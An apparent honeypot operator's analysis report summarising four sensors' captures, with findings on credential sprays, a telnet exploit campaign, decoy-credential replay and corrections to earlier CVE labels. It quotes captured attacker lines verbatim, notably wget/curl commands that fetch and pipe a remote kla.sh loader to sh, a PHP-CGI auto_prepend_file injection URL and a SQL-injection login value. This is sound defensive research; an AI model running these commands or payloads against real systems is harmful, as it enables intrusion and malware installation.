# SESSION 40 — Four-Sensor Pull (to 2026-09-24): What Was Genuinely New, and Five Corrections

**Date:** 2026-09-24
**Host:** `ubuntu-4gb-hel1-2` (Hetzner, 62.238.47.215)
**Sensors:** Cowrie (22/23), mailoney (25), wp-honeypot (80), Dionaea (Docker)
**Excluded from all figures:** `104.241.55.33` (analyst), `127.0.0.1` (mailoney self-tests)

---

## 0. Scope — and why this session is short on "firsts"

A full re-pull of all four sensors was run before checking the repo. Checking the repo
afterwards showed that most of what the pull surfaced had already been documented:

| Surfaced again this session | Already documented in |
|---|---|
| Dionaea PE32 samples are WannaCry (kill switch, `tasksche.exe`, `mssecsvc2.0`) | S30 §5, S38 §6.6 |
| RedTail across Cowrie (SCP kit) and wp-honeypot (`libredtail-http`) | S30 §6, S32 §1 |
| `sshd`-named uploads are the **pan-chan** Go mining platform | S32 §2 |
| `6d1fe6ab…` random-name uploads are **Linux.MulDrop.14** | S33 §1 |
| mailoney `ylmf-pc` / lowercase / AUTH LOGIN defect | S38 §5 (fixed 2026-09-22) |
| `dpr@priv8shop.com` relay probes, `196.251.121.140` | S38 §5.5 |
| Fake Googlebot `94.154.46.244` | S38 §6.7 |
| Research-scanner splitting before counting actors | S32 §7, lessons |

This session records only what those sessions do not: new actors, new mechanisms, the
first post-fix mailoney captures, and corrections.

**Corpus for this pull**

| Sensor | Window (UTC) | Volume |
|---|---|---|
| Cowrie | 08-30 02:37 → 09-24 12:05 | 46,405 connects · 90,625 commands · 1,570 downloads · 71 uploads · 2,508 pivots |
| mailoney | 08-29 22:42 → 09-24 11:10 | 1,844 sessions · 1,480 with client input · 14 credential rows · 13 `.eml` |
| wp-honeypot | 08-29 22:52 → 09-24 11:50 | 43,967 requests (43,046 GET · 837 POST · 84 HEAD) |
| Dionaea | 08-31 13:55 → 09-24 12:07 | 117,616 connections · 222 downloads · `PRAGMA integrity_check` = `ok` |

Artifact retention is working: Cowrie `downloads/` holds 145 files and `tty/` 1,791
(both were empty at the time of session 21).

---

## 1. mailoney — the first captures after the session-38 fix

### 1.1 Separating the test rows

```text
cred 1-8   127.0.0.1        2026-09-22 20:32 – 20:49   (session-38 verification)
cred 9-14  160.250.128.49   2026-09-23 17:32 – 20:45
```

Rows 1–8 are the session-38 test (`testuser/password123`, then `spammer` with
`pw5`…`pw9`, `pwfinal`, 1.5 s apart). They are excluded. **Rows 9–14 are the first
real SMTP credentials this sensor has ever captured.**

### 1.2 A low-and-slow credential spray

```text
17:32:17  user    / user
18:10:44  admin   / admin
18:49:51  test    / test
19:28:32  sales   / sales
20:06:40  scan    / scan
20:45:27  scanner / scanner
```

Six attempts at a near-constant **~38-minute interval**, username = password each time.
This is the opposite of `ylmf-pc`'s 1,205 sessions in 15 minutes: a sprayer paced to
stay under per-IP rate limits and lockout counters.

Under session 38's staged response, the sixth attempt from an IP is answered
`235 Authentication successful`. `scanner/scanner` was the sixth. **No message from
`160.250.128.49` appears in `captured_mail/`.** If the 235 was actually sent (the
counter resets on service restart), the client took a "successful" login and did not use
it — consistent with a **credential validator** that collects working logins for later
use or resale rather than sending immediately. Unverified; see §9.

Neighbourhood note only: `160.250.132.238` delivered the PHP-CGI RedTail payload in
session 30. Same /20, no further link established.

### 1.3 The relay checker reported the IP as usable

Among the 13 `.eml` files:

```text
Subject: Valid SMTP 62.238.47.215
Subject: relay test
From: <test@your-server.de>   To: <test@gmail.com>
```

**A relay-testing tool mailed its operator a message whose subject line is this server's
IP labelled "Valid SMTP."** From the attacker's side, the honeypot passed. Expect relay
traffic to grow as that result propagates through whatever list it feeds.

New senders since session 38: `178.16.53.247` (09-22), `185.169.4.119` (09-23),
`178.16.55.192` (09-24), plus `196.251.121.140` continuing almost daily. Envelope
senders now include `spameri@tiscali.it` (7). Neighbourhood note only: `178.16.55.224`
is published as a RedTail C2 on AS214943 (Railnet); two of the new senders sit in the
same /22. Not an attribution.

### 1.4 Verified: nothing leaves the box

```bash
timeout 6 bash -c '</dev/tcp/gmail-smtp-in.l.google.com/25' && echo OPEN || echo BLOCKED
# port 25 OUT: BLOCKED
```

Session 38 established that mailoney never delivers. This confirms it at the network
layer as well: outbound TCP/25 is blocked (Hetzner default). A "Valid SMTP" listing
cannot turn into real spam from this IP.

---

## 2. CVE-2026-24061 — a scheduled campaign, and the first "success" event

### 2.1 Volume

29 `cowrie.telnet.exploit_attempt` events this window (3 in session 21's week), all the
same `USER=-f root` argument injection. Many sources are Azure address space
(`20.x`, `52.x`, `172.17x.x`) — rented VMs.

### 2.2 `94.154.43.196` — 16 of 29, on a cadence

Attempts on 09-01, 09-02, 09-03, 09-04, 09-05, 09-06, 09-07, 09-09 (×2), 09-12, 09-14,
09-16, 09-18, 09-21, 09-23: roughly every one to three days for three weeks. The same IP
pairs the telnet exploit with the `kla.sh` loader over SSH:

```text
echo SHELL_TEST
/bin/busybox TEST
cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh
cd /tmp || cd /var/tmp || cd /; curl -s http://176.65.139.196/bins/kla.sh | sh
cd /tmp || cd /var/tmp || cd /; busybox wget -q -O- http://176.65.139.196/bins/kla.sh | sh
```

### 2.3 The loader changed on 2026-09-21

Every run through 09-20 used the sequence above. **From 09-21 04:19 onward** the same IP
prepends a writable-directory survey:

```text
echo WRITABLE >/tmp/.testfile 2>&1      ; ls -l /tmp/.testfile 2>&1
echo WRITABLE >/var/tmp/.testfile 2>&1  ; ls -l /var/tmp/.testfile 2>&1
echo WRITABLE >/dev/shm/.testfile 2>&1  ; ls -l /dev/shm/.testfile 2>&1
echo WRITABLE >/var/run/.testfile 2>&1  ; ls -l /var/run/.testfile 2>&1
```

and on 09-23 adds cleanup (`rm -f /tmp/.testfile`) and collapses the fetch into a single
`(wget … || curl …)` line. **An operator's tooling revision, dated to within hours.**

This also names a contributor to session 38 §6.1's caveat: Cowrie logs redirected output
(`echo … > file`) as `file_download`, so this actor's new survey inflates the dropper
count from 09-21.

### 2.4 `cowrie.telnet.exploit_success` — first occurrence, not a bypass

```json
{"src_ip":"150.241.87.249","cve":"CVE-2026-24061","username":"root",
 "attempted_command":"id","eventid":"cowrie.telnet.exploit_success",
 "timestamp":"2026-09-21T08:33:18Z","message":"CVE-2026-24061 exploit successful: logging in as root"}
```

This is Cowrie's emulation of the vulnerability doing what it is built to do: accept the
injection, grant a fake root session, record the follow-up command (`id`). It is the only
one of 29 attempts whose tooling issued a command afterwards. `150.241.87.134`, a /24
neighbour, attempted the same exploit on 09-23.

---

## 3. `205.147.17.14` — a human, and the first payload recovered from a TTY recording

17 interactive sessions (the most of any IP this window), concentrated on 2026-09-06.

**Environment analysis before anything else:**

```text
ps -efH  (repeatedly)      mount / cat /proc/self/mounts
ls -Alh /proc/1            ls -Alh /proc/969
netstat -anpW46            man netstat
apt install busybox-static
busybox ls -Alh ../acampbell/
```

Installing `busybox-static` to get trustworthy tools is the same instinct session 32 §4
recorded for `94.104.96.90`, which fetched busybox from busybox.net. Two unrelated humans,
same move: **don't trust the target's binaries, bring your own.**

**Then a payload transfer with no network download:**

```text
03:41:29  base64 -d > x
03:41:38  chmod +x x
03:41:40  ./x
03:41:59  ./x
03:42:13  rm x
03:42:28  base64 -d > x
```

The binary was pasted as base64 text into the terminal. No `wget`, no SCP — so no
`file_download` or `file_upload` event exists for it. The only record is the TTY
recording of the session (`dd7e4daef8a2`).

**Recovered** by extracting the longest base64 run from the TTY file and decoding it into
a root-only directory — never executed:

```text
/root/quarantine/3a687bc37ce459ba9e67a5287441b8fdedad9f079256467c91dda8cc98f7782a.bin
348 bytes · ELF 64-bit LSB executable, ARM aarch64, statically linked, no section header
```

A 348-byte static ELF with no section header is hand-built, not compiled from a normal
toolchain — a stager or a probe. It is **ARM64**, while Cowrie presents an x86-64 host;
whether that mismatch is deliberate (a test of whether the host really executes
anything) or careless is open until it is disassembled (§9).

**Method worth keeping:** with TTY retention on, a base64 paste is recoverable even
though no Cowrie event describes a file.

---

## 4. `23.135.92.87` — reading the decoys, then replaying them against another service

On 2026-08-29 this IP ran an interactive SSH session that went straight through the
decoy set: `api_credentials_dump.json`, `customer_list_private.csv`, the
`Definitely_NOT_Epstein_Client_List.txt` / `please_read.txt` pair, `wp-config.php`,
`backup/users_dump.sql`, and `/root/credentials_dump.json | grep admin -C 4`. It also
tried the database directly: `mysql -u wp_appprod wp_approd`.

Partway through, it typed:

```text
i hate this fake fucking shell that doesnt have real commands
```

**Explicit honeypot detection**, from missing tooling rather than any single tell.

The same day, the same IP hit the web honeypot's login form:

```text
log=admin&pwd=Wp!AppProd-2019
log=admin@company.internal&pwd=$2y$10$examplehash
log=admin@company.internal&pwd=' OR 1=1--
```

followed by a run of `admin_<random>` / random-password pairs.

**Evidence the values came from the decoys:** `AppProd-2019`, `examplehash` and
`company.internal` occur in 10 Cowrie TTY recordings — the output the honeypot served to
attackers — and nowhere else under the Cowrie tree an attacker could reach. The specific
TTY file for this IP's session was not individually matched (§9).

**Assessment:** decoy credentials harvested over SSH and replayed against HTTP — the
canary pattern working across two sensors, from an attacker who had already concluded
the shell was fake and tried anyway.

---

## 5. `31.16.87.114` — returns, and a revised read of intent

Session 21 documented this IP's full Discovery → Credential Access → Lateral Movement
chain. It returned on 08-30, 09-04 and 09-10 (63 commands):

```text
08-30  sudo su - acampbell ; cat crypto/wallet_backup.txt ; chmod 750 .profile
       1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNac          ← Bitcoin genesis-block address
       apt update && apt upgrade -y ; lsblk ; du -h /
09-04  nano /etc/group ; nano miau ; cp miau miau2 ; mv miau2 /etc/group
09-10  cat /dev/random
```

The genesis-block address is a joke, not a wallet. `miau` is German for "meow". Across
four visits from a German residential line, this reads as **a skilled hobbyist who knows
the box is a honeypot and keeps probing its edges**. Session 21's kill-chain description
of *what was done* stands; its framing of *intent* should be read in that light.

---

## 6. wp-honeypot — what the earlier sessions did not cover

### 6.1 `129.227.46.131` — hunting for hosted malware

12,932 requests (29% of the window), almost every path unique:

```text
/huhu/jawirbot.spc   /bin/femboy.x86   /37.exe   /atomic/main_arm5
/bins/UnHAnaAW.arm   /herios.arc       /cloud/form_11286.pdf.ps1
/596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.arm
```

These are malware drop-path names, requested *from* this server. The pattern fits a
crawler testing whether IPs are hosting known payload paths — a hunter, not an
exploiter. No reverse DNS. Kept hedged.

### 6.2 RedTail's HTTP tool runs one fixed playbook

15+ source IPs each sent **exactly 47** `libredtail-http` requests: the PHP-CGI
injection POSTs plus a sweep of PHPUnit `eval-stdin.php` paths (CVE-2017-9841). Top
senders: `31.132.90.3` (132), `45.43.60.98` (94), `163.7.1.156` (88). One tool, deployed
widely — which is why per-IP counts cluster on the same number.

### 6.3 The fake-Googlebot block

Session 38 identified `94.154.46.244` (150 requests, no reverse DNS). The full extent is
`94.154.46.243`–`.250`: roughly **2,690** requests under a Googlebot user-agent from a
block that is not Google address space. The genuine Googlebot hits in the same window
come from `66.249.x` and `192.178.7.x`.

### 6.4 AndroxGh0st

```text
2026-09-24 11:50  180.93.234.13  POST /  0x[]=androxgh0st
```

The marker of the AndroxGh0st Laravel credential stealer — consistent with the `.env`
hunting that dominates this sensor (`/.env` 192, `/.env.local` 131, `/.env.production`
120, `/.aws/credentials` 96, `/docker-compose.yml` 87 …).

---

## 7. Four-sensor intersection

First intersection including all four sensors (all retained data):

```text
unique IPs   ssh 6,024 · dionaea 3,886 · http 1,601 · smtp 173
on 2+ sensors: 793        on all 4: 11
```

Reverse DNS on the all-four set:

```text
172.235.181.226  prod48client01.academyforinternetresearch.org
3.129.187.38     scan.visionheight.com
18.116.101.220   scan.visionheight.com
45.91.64.7       scan.f6.security
85.217.149.31    o032.scanner.modat.io
184.105.139.68   scan-02.shadowserver.io
(remainder: DigitalOcean, no PTR)
```

**Every self-identifying IP that touched all four sensors is a research scanner.** This
is session 32's rule — split scanners out before counting actors — confirmed at the
strongest possible filter. Breadth of contact is a property of census scanning, not of
threat.

What *does* survive the filter is coherence across sensors. `194.50.16.198`, recorded in
session 32 as a "port sprayer," is more specific than that: its HTTP requests target
FreePBX / Asterisk / vtiger consoles (`/_asterisk/graph.php`, `/recordings/index.php`,
`/admin/modules/core/graph.php`), and it made 212 SIP connections on Dionaea. It sprays
those same HTTP requests at other ports, which is why Cowrie logged
`User-Agent: python-requests/2.27.1` as a "command." **A VoIP-targeting actor**, not
noise.

---

## 8. Corrections

### 8.1 The `%ADd` PHP-CGI path is CVE-2024-4577, not CVE-2012-1823 (sessions 30, 32, 38)

Sessions 30 §6, 32 §1.4 and 38 §6.7 label this request as CVE-2012-1823:

```text
/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
```

`%AD` is a soft hyphen. On Windows, PHP-CGI's command line passes through "Best-Fit"
character conversion, which turns the soft hyphen into `-` — so `%ADd` becomes a `-d`
option. **That bypass of the 2012 fix is CVE-2024-4577.** The plain-hyphen form
(`-d+allow_url_include…`) is CVE-2012-1823. `161.132.54.212` sent both forms within two
seconds on 09-24, so RedTail's tool tries each. SANS ISC's RedTail guest diary describes
exactly this request body as the CVE-2024-4577 exploit.

### 8.2 Session 21 — port 2535 was never SMTP

Session 21 labelled pivot port 2535 an "SMTP submission variant." SMTP submission is
587. This window: 633 direct-tcpip requests to 2535 from three IPs (`193.46.255.86` 242,
`2.57.121.112` 236, `2.57.121.25` 155), all to `62.210.131.144`, with **zero** captured
`direct-tcpip.data` payload. The service is unknown and should not be labelled.
Separately, the mail share of pivots fell: port 25 is 167 of 2,508 this window; 80 and
443 now dominate (831 / 593).

### 8.3 Session 21 — the `sshd` uploads were not zero-byte tests

Session 21 described the `sshd` uploads as zero-byte write tests. Only those with hash
`e3b0c442…` (the empty-file SHA-256) are. The rest are real x86-64 ELF binaries —
session 32 identified them as **pan-chan**.

### 8.4 Session 21 — "multi-vector = upgraded threat" needs a scanner filter

Session 21 promoted actors for appearing on more than one sensor. §7 above shows that the
broadest cross-sensor contacts are research scanners. Multi-sensor presence only means
something after scanners are removed, and then *coherence* (same target class on each
sensor) matters more than *breadth*.

### 8.5 A consequence of session 31's download cap

Session 31 set `download_limit_size = 10485760`. Four new `sshd` uploads share hash
`7a9da7d10aa80b0f…` and are **exactly 10,485,760 bytes** — the cap:

```text
2026-09-17  43.226.44.65      2026-09-23  218.98.97.7
2026-09-18  198.163.196.152   2026-09-24  103.232.25.144
```

pan-chan builds run 4–30 MB (session 32). Identical truncated hashes from four IPs
indicate one build whose first 10 MiB match — but **every pan-chan sample above 10 MiB is
now stored incomplete**. The cap fixed the disk risk and quietly cost sample fidelity
for the largest family on the sensor. Disk has ample headroom (~29 GB free at session
26); raising the cap to 64 MiB is proposed in §9.

Smaller `sshd` uploads `062ba629…` (98,304 B) and `47b268c2…` (163,840 B) are exact
multiples of 32 KiB, consistent with interrupted transfers; `c71b30e5…` (5.7 MB) and
`e23dbf6f…` (2.5 MB) are not in session 32's list. None of the four is yet confirmed as
pan-chan.

---

## 9. Open items

- **Disassemble the recovered 348-byte aarch64 ELF** (`3a687bc3…`). `xxd` it on the VPS
  and disassemble off-box; do not execute.
- **mailoney: confirm what `160.250.128.49` received on its sixth attempt** (session
  2111) — did the staged `235` fire, and did the client send anything after it?
- **Match `23.135.92.87`'s TTY recording** to the decoy-string hits to close §4's one
  inference.
- **Confirm pan-chan membership** for `7a9da7d1`, `c71b30e5`, `e23dbf6f`, `062ba629`,
  `47b268c2`: `grep -c "pan-chan's mining island" <file>` (may miss on the truncated
  sample if the string sits past 10 MiB).
- **Raise `download_limit_size`** to `67108864` (64 MiB) in `etc/cowrie.cfg`; restart
  Cowrie.
- **Manual VirusTotal lookups** (no API key): the five hashes above plus `3a687bc3…`.
- Carried from session 38: next freeze's `gdb-bt.txt`; mailoney disk growth; recompute
  dropper count excluding redirect writes (§2.3 names one source of them).

---

## 10. Lessons

- **Check the repo before writing the report.** This pull re-derived four sessions'
  findings from scratch. The analysis was not wasted — it independently reproduced them —
  but writing it up as new would have been wrong.
- **Corrections compound.** Session 38 fixed mailoney; this session's first read of the
  same data called the bug "the standout finding" because the fix date was not checked
  against the failure dates. Every lost `ylmf-pc` attempt predates 2026-09-22.
- **A CVE label is a claim about mechanism.** `%ADd` and `-d` look alike and exploit the
  same parser; the difference is exactly what the 2024 CVE is about.
- **TTY retention recovers what events cannot describe.** A pasted binary produces no
  file event at all.
- **Displaying a captured sample is the session-33 precondition.** This session ran
  `head -c` on the MulDrop script in a root shell — the same display that preceded the
  incident. Nothing ran. The rule should be mechanical rather than attentive: prefix
  every displayed line so a paste is inert —
  `head -c 1500 <sample> | sed 's/^/# /'`.
- **Breadth is not threat.** Everything that touched all four sensors was a scanner.

---

## References

- SANS ISC, *Danger of Libredtail* (guest diary) — https://isc.sans.edu/diary/32936 —
  the `%ADd … auto_prepend_file=php://input` request as CVE-2024-4577.
- ITNEXT, *RedTail Cryptominer: First Evidence of Docker API Targeting* (2025-11) —
  `178.16.55.224` as RedTail C2, AS214943 (Railnet).
- DinoTools/dionaea issue #240 — 5,267,459-byte corrupted WannaCry captures produced by
  Dionaea's DoublePulsar emulation.
